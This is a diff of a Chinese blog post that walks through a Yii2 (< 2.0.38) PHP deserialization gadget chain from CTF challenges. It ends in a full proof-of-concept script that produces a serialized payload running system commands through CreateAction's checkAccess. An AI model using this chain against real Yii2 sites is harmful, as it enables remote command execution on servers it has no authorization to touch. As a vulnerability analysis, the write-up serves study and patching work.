@@ -84,24 +84,177 @@
 
                 <h2 class="section-heading">前言</h2>
 
-                <p>&nbsp;&nbsp;&nbsp;在红帽杯跟国赛都出了这个框架的反序列化题，借此机会来分析一下该框架漏洞</p>
+                <p>&nbsp;&nbsp;&nbsp;在红帽杯跟国赛都出了Yii2框架的反序列化题，借此机会来分析一下该框架漏洞</p>
 
                 <h2 class="section-heading">配置环境</h2>
 
-                <p>&nbsp;&nbsp;&nbsp;在github下了这个源码</p>
+                <p>&nbsp;&nbsp;&nbsp;在github下了这个版本的源码。</p>
 
                 <a href="#">
                     <img class="img-fluid" src="../img/2021-5-18/install.jpg" alt="">
                 </a>
 
-                <p>&nbsp;&nbsp;&nbsp;SiteController中加入反序列化点</p>
+                <p>&nbsp;&nbsp;&nbsp;SiteController中加入反序列化点，通过r=site%2Ftest来触发。</p>
 
                 <a href="#">
                     <img class="img-fluid" src="../img/2021-5-18/start.jpg" alt="">
                 </a>
-
                 
+                <h2 class="section-heading">利用条件</h2>
+                
+                <p>&nbsp;&nbsp;&nbsp;Yii2 < 2.0.38</p>
+                
+                <h2 class="section-heading">利用链</h2>
+                
+                <div>
+                	
+                	<pre class='hljs'><code>yii<span class="hljs-command">\db</span><span class="hljs-command">\BatchQueryResult</span>::__destruct()
 
+Faker<span class="hljs-command">\Generator</span>::__call()
+
+yii<span class="hljs-command">\rest</span><span class="hljs-command">\CreateAction</span>::run()</code></pre>
+                	
+                </div>
+                
+                
+                <h2 class="section-heading">构造利用链</h2>
+                
+                <p>&nbsp;&nbsp;&nbsp;触发点：/vendor/yiisoft/yii2/db/BatchQueryResult.php，
+                    $this->_dataReader参数可控，可以用来触发__call方法。</p>
+                
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-5-18/pop-1.jpg" alt="">
+                </a>
+                <span class="caption text-muted">令$this->_dataReader = new Generator()</span>
+                
+                
+                <p>&nbsp;&nbsp;&nbsp;全局搜一下__call方法，找到/vendor/fzaninotto/faker/src/Faker/Generator.php</p>
+                
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-5-18/pop-2.jpg" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;跟进一下Generator.php，进入__call方法后，调用了$this->format($method, $attributes)，
+                	查看一下$this->format($method, $attributes)的调用情况。</p>
+                
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-5-18/pop-3.jpg" alt="">
+                </a>
+                
+                
+                <p>&nbsp;&nbsp;&nbsp;将$this->getFormatter($formatter)的返回值作为参数，
+                	传入call_user_func_array($this->getFormatter($formatter), $arguments)。
+                	这里的$this->getFormatter($formatter)可控，而$arguments不可控。
+                	所以我们还需要找一个执行类去回调。</p>
+                
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-5-18/pop-4.jpg" alt="">
+                </a>
+                <span class="caption text-muted">令$this->formatters = ['close' => [new CreateAction(), 'run']]</span>
+                
+                <p>&nbsp;&nbsp;&nbsp;这里找了一个参数可控的call_user_func，/vendor/yiisoft/yii2/rest/CreateAction.php</p>
+                
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-5-18/pop-5.jpg" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;控制$this->checkAccess为系统函数，
+                	来回调系统函数进行命令执行。</p>
+                
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-5-18/pop-6.jpg" alt="">
+                </a>
+                <span class="caption text-muted">令$this->checkAccess = 'system'和$this->id = 'ls';</span>
+                
+                
+                
+                
+                
+                
+                <h2 class="section-heading">POC</h2>
+                
+                <div>
+                	
+                	<pre class='hljs'><code><span class="php"><span class="hljs-preprocessor">&lt;?php</span>
+
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span>;
+
+<span class="hljs-keyword">use</span> <span class="hljs-title">Faker</span>\<span class="hljs-title">Generator</span>;
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BatchQueryResult</span>
+</span>{
+    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_dataReader</span>;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">(<span class="hljs-variable">$obj</span>)</span>
+    </span>{
+        <span class="hljs-variable">$this</span>-&gt;_dataReader = <span class="hljs-variable">$obj</span>;
+    }
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span>
+    </span>{
+    }
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">reset</span><span class="hljs-params">()</span>
+    </span>{
+    }
+}
+
+<span class="hljs-variable">$pwn</span> = <span class="hljs-keyword">new</span> BatchQueryResult(<span class="hljs-keyword">new</span> Generator());
+<span class="hljs-keyword">echo</span> base64_encode(serialize(<span class="hljs-variable">$pwn</span>));
+
+
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">Faker</span>;
+
+<span class="hljs-keyword">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>\<span class="hljs-title">CreateAction</span>;
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generator</span>
+</span>{
+    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$formatters</span> = [];
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span>
+    </span>{
+        <span class="hljs-variable">$this</span>-&gt;formatters = [<span class="hljs-string">'close'</span> =&gt; [<span class="hljs-keyword">new</span> CreateAction(), <span class="hljs-string">'run'</span>]];
+    }
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span><span class="hljs-params">(<span class="hljs-variable">$method</span>, <span class="hljs-variable">$attributes</span>)</span>
+    </span>{
+    }
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">format</span><span class="hljs-params">(<span class="hljs-variable">$formatter</span>, <span class="hljs-variable">$arguments</span> = array<span class="hljs-params">()</span>)</span>
+    </span>{
+    }
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFormatter</span><span class="hljs-params">(<span class="hljs-variable">$formatter</span>)</span>
+    </span>{
+    }
+}
+
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>;
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Action</span>
+</span>{
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$checkAccess</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span>
+    </span>{
+        <span class="hljs-variable">$this</span>-&gt;checkAccess = <span class="hljs-string">'system'</span>;
+        <span class="hljs-variable">$this</span>-&gt;id = <span class="hljs-string">'ls'</span>;
+    }
+}
+
+
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>;
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CreateAction</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Action</span>
+</span>{
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span><span class="hljs-params">()</span>
+    </span>{
+    }
+}</span></code></pre>
+                	
+                </div>
+                
 
                 <h2 class="section-heading">There Is Nothing Below</h2>
                 <p>&nbsp;&nbsp;&nbsp;</p>
